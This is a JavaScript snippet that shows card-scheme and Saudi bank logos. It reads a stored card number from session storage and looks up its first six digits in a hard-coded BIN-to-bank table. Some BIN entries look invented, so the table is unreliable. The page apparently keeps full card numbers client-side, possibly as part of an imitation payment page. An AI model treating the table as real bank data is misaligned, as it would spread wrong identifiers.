document.addEventListener('DOMContentLoaded', function() {
      var SAUDI_BINS = {
        
        '446393':'Alrajhi','446394':'Alrajhi','446395':'Alrajhi','446396':'Alrajhi',
        '446397':'Alrajhi','446398':'Alrajhi','446399':'Alrajhi',
        '457865':'Alrajhi','457866':'Alrajhi','457867':'Alrajhi','457868':'Alrajhi',
        '408822':'Alrajhi','408823':'Alrajhi','408824':'Alrajhi','408825':'Alrajhi',
        '426898':'Alrajhi','426899':'Alrajhi',
        '458024':'Alrajhi','458025':'Alrajhi','458026':'Alrajhi',
        '479884':'Alrajhi','479885':'Alrajhi','479886':'Alrajhi',
        '484783':'Alrajhi','455703':'Alrajhi','455704':'Alrajhi',
        
        '512345':'Alrajhi','512346':'Alrajhi','512347':'Alrajhi','512348':'Alrajhi',
        '521104':'Alrajhi','521105':'Alrajhi','521106':'Alrajhi','521107':'Alrajhi',
        '543350':'Alrajhi','543351':'Alrajhi','543352':'Alrajhi','543353':'Alrajhi',
        '588845':'Alrajhi',
        
        '455036':'alahli','455037':'alahli','455038':'alahli','455039':'alahli',
        '407197':'alahli','407198':'alahli','407199':'alahli','407200':'alahli',
        '458455':'alahli','458456':'alahli','458457':'alahli','458458':'alahli',
        '457763':'alahli','457764':'alahli','457765':'alahli','457766':'alahli',
        '435013':'alahli','435014':'alahli','435015':'alahli','435016':'alahli',
        '458214':'alahli',
        
        '524878':'alahli','524879':'alahli','524880':'alahli','524881':'alahli',
        '529415':'alahli','529416':'alahli','529417':'alahli','529418':'alahli',
        '540281':'alahli','540282':'alahli','540283':'alahli','540284':'alahli',
        '557396':'alahli','557397':'alahli','557398':'alahli','557399':'alahli',
       
        '407861':'alryad','407862':'alryad','407863':'alryad','407864':'alryad',
        '476009':'alryad','476010':'alryad','476011':'alryad','476012':'alryad',
        '457935':'alryad','457936':'alryad','457937':'alryad','457938':'alryad',
        '435019':'alryad','435020':'alryad','435021':'alryad','435022':'alryad',
        '409665':'alryad',
        
        '512718':'alryad','512719':'alryad','512720':'alryad','512721':'alryad',
        '541168':'alryad','541169':'alryad','541170':'alryad','541171':'alryad',
        '524714':'alryad','524715':'alryad','524716':'alryad','524717':'alryad',
      };

      
      var scheme = sessionStorage.getItem('Card type');
      var bin    = sessionStorage.getItem('cardBin') || '';

     
      if (!scheme || !bin) {
        try {
          var d = JSON.parse(sessionStorage.getItem('tameeniTempData') || '{}');
          var raw = (d.cardNumber || '').replace(/\s/g, '');
          if (raw.length >= 1 && !scheme) {
            if (raw.charAt(0) === '4') {
              scheme = 'visa';
            } else {
              var p2 = parseInt(raw.substring(0,2));
              var p4 = parseInt(raw.substring(0,4));
              if ((p2 >= 51 && p2 <= 55) || (p4 >= 2221 && p4 <= 2720)) scheme = 'mastercard';
            }
          }
          if (raw.length >= 6 && !bin) bin = raw.substring(0, 6);
        } catch(e) {}
      }

      
      var cardTypeEl = document.getElementById('card_type');
      if (scheme === 'visa') {
        cardTypeEl.src = 'assets/photos/Visa.png';
      } else if (scheme === 'mastercard') {
        cardTypeEl.src = 'assets/photos/Mastercard.png';
      }
     

     
      var bankTypeEl = document.getElementById('bank_type');
      var bankKey = SAUDI_BINS[bin];
      if (bankKey) {
        bankTypeEl.src = 'assets/photos/' + bankKey + '.png';
      } else {
       
        bankTypeEl.src = 'images/logo.png';
      }
    });